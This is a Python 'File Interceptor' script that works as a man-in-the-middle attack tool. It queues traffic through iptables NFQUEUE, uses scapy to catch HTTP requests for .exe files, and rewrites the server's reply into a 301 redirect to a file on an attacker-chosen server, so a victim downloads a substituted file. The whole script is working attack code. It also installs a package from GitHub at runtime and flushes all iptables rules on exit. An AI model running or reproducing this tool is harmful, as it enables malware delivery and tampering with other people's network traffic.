#import libraries and modules
import subprocess
import optparse
import scapy.all as scapy

try:
    import netfilterqueue
except:
    subprocess.call(["pip3","install", "-U", "git+https://github.com/kti/python-netfilterqueue"])
    import netfilterqueue

def get_args():
    '''
    Get command line arguments
    '''

    parser = optparse.OptionParser()
    parser.add_option("-o", "--packet-origin", dest="packet_origin", default="own",help="Origin of packets: can be 'own' or 'remote'")
    parser.add_option("-s", "--source-server", dest="source_server", default="10.0.2.15",help="IP address of file origin")
    parser.add_option("-p", "--file-path", dest="file_path", default="monkey.jpg", help="File path to interjection file")

    (options, _) = parser.parse_args()

    if (options.packet_origin != "own") and (options.packet_origin != "remote"):
        parser.error("[-] Specify the origin of the packets using '-o <own/remote>' or use '--help' for more info")
        quit()
    else:
        return options.packet_origin, options.source_server, options.file_path

ack_list = [] #to collect ack-value in requests and compare them to seq -values in response packets, to figure out which ones belong together

def set_load(packet, load):
    packet[scapy.Raw].load = load  # redirects to another url / location

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    # del scapy_packet[scapy.TCP].len #NOTE: TCP layer has no field named 'len', only UDP-layer like used in dns_spoof.py
    del packet[scapy.TCP].chksum

    return packet


def process_packet(packet):
    _, source_server, file_path = get_args()
    scapy_packet = scapy.IP(packet.get_payload()) #draping the original packet into a scapy-IP-layer wil automatically convert it into a scapy packet
    if scapy_packet.haslayer(scapy.Raw): #RR - response; RQ - request
        if scapy_packet[scapy.TCP].dport == 80: #to use scapy to check for HTTP requests and responses, check the TCP-layer -this layer contains sport (=source-port) and dport (=destination-port); if the sport is an HTTP-port, then the package contains an HTTP-response
            if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] .exe Request")
                ack = scapy_packet[scapy.TCP].ack
                ack_list.append(ack)
                print(scapy_packet.show())
                print("\n")
            else:
                pass
        elif scapy_packet[scapy.TCP].sport == 80:
            seq = scapy_packet[scapy.TCP].seq

            if seq in ack_list:
                ack_list.remove(seq)
                print("[!] Replacing .exe file")

                new_scapy_packet = set_load(scapy_packet, f"HTTP/1.1 301 Moved Permanently\nLocation: http://{source_server}/{file_path}\n\n")

                packet.set_payload(bytes(new_scapy_packet))

                print("[+] File replaced")
                print("\n")
            else:
                pass
        else:
            pass

    packet.accept() #forwards packet to its destination; using 'packet.drop()' will drop the packet and cut the internet connection of the client


print("===================")
print("Starting File Interceptor")
print("===================")

packet_origin, _, _ = get_args()

if packet_origin == "remote":
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "666"])
elif packet_origin == "own":
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "666"])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "666"])

try:
    queue = netfilterqueue.NetfilterQueue() # object that is going to interact with queue 666 created above
    queue.bind(666, process_packet) # binds variable 'queue' to 666 and executes a function on every packet in the queue
    queue.run()
except KeyboardInterrupt:
    print("Shutting down program...")
    print("Flushing IP Tables...")
    subprocess.run(["iptables","--flush"])
    print("IP Tables successfully reset.")
    exit()

